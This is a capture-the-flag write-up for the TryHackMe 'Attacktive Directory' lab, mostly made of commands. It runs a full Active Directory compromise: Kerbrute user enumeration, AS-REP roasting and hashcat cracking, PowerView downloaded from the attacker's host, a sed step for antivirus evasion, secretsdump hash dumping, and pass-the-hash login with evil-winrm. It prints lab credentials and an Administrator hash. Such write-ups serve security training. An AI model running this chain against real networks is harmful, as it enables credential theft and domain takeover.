---
date: 2025-03-05
categories: [CTF, THM]
title: "THM - Attacktive Directory"
tags: ['hashcat', 'impacket', 'ldap', 'linux', 'nmap', 'privilege escalation', 'rce', 'secretsdump', 'smb', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Attacktive Directory - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - Attacktive Directory

- NMAP

![image1](../resources/406f6695291c4749b73606d43103c777.png)

```bash
nmap -n -sV --script="ldap\* and not brute" 10.10.123.209

```

![image2](../resources/21a0bb4a8c6f4a85aae827c8b08b2bc6.png)


![image3](../resources/9492bebb8acc4b4ba0a00b63e7eb4863.png)

- Enumerate users with Kerbrute:

```bash
./kerbrute userenum --dc 10.10.123.209 -d spookysec.local userlist.txt -o validusers.txt

```
(Using the provided userlist to cut down on enumeration time)


![image4](../resources/6359efe477b946ac8545e0890e13b941.png)

- Cut fields:

```bash
cat validusers.txt | cut -d " " -f 8 > validusers_edited.txt

```

![image5](../resources/f5253e54d5314db4b0bfe97dda247c0b.png)

- ASRepRoasting:

```bash
impacket-GetNPUsers spookysec.local/ -users validusers_edited.txt -no-pass -dc-ip 10.10.123.209

```

![image6](../resources/d3be60a69983476c9760e5c8d889d8ec.png)

- Copy hash to file (hash)

- Crack with hashcat:

```bash
hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt

```

![image7](../resources/1ae9a47ff79b4940b6d6c3ca4499140a.png)

Got credentials: **svc-admin : management2005**

- RDP:

```bash
xfreerdp /v:10.10.123.209 /u:svc-admin /p:management2005 /dynamic-resolution /cert:ignore

```

![image8](../resources/5dc5c24db85646779d67504c1dcee02b.png)

- Enumeration:

```bash
query user

```

![image9](../resources/31fd3fe9bc5a4b87918a76b586d7c82e.png)

Only us logged in

- Upload PowerView.ps1:

```bash
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/PowerView.ps1', 'C:\Users\svc-admin\PowerView.ps1')

```

![image10](../resources/7e283975acf14b2baa546b84c5a43bb1.png)

**<u>AV Workaround for PowerView:</u>**

```bash
  sed '/<#/,/#>/d' PowerView.ps1 > new_powerview.ps1
```

![image11](../resources/8f4a6f3f7f224933b636c0945ab94248.png)

```bash
(New-Object System.Net.WebClient).DownloadFile('http://10.8.24.66:8080/new_powerview.ps1 ', 'C:\Users\svc-admin\new_powerview.ps1 ')

```

![image12](../resources/7c9c5805aca0431eaab9663b5f7a3834.png)

Loaded the updated script but still doesn't run

Moving on...

- With credentials - Run enum4linux again:

![image13](../resources/f0728b3d070c4777a2a719ecf0f26c13.png)

- We have a share /backup  
  Connect with:

```bash
smbclient //10.10.173.147/backup -U thm-ad/svc-admin%management2005

```

![image14](../resources/57ca31fa34ed4160afde9990a2c2f62f.png)


![image15](../resources/40e4302c66704969984b3bde4749c0e8.png)


![image16](../resources/6d7eb32d586949d0be9170b55476f895.png)

- Looks like base64:

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d

```

![image17](../resources/9bba6007407a44c092521ae3afe1d9c7.png)

- We can see that there is a domain user called backup - and we have the creds:
**backup@spookysec.local:backup2517860**

- There is a clue in the THM Task description:

![image18](../resources/46edce029af74d30b3d70291f8247b03.png)

- To dump hashes use:

```bash
impacket-secretsdump spookysec.local/backup:backup2517860@10.10.173.147 -dc-ip 10.10.173.147

```

![image19](../resources/701bb2f608b14e8da350129bb4ae6a0f.png)

- You can use the hash with evil-winrm to connect:

```bash
evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.173.147

```

![image20](../resources/bdbf6af48f124efdb9fad24dc703c072.png)


![image21](../resources/d2c6ad9920324007a48601c706585728.png)


![image22](../resources/e12d14a8e612485ba9f6176eae0e75b5.png)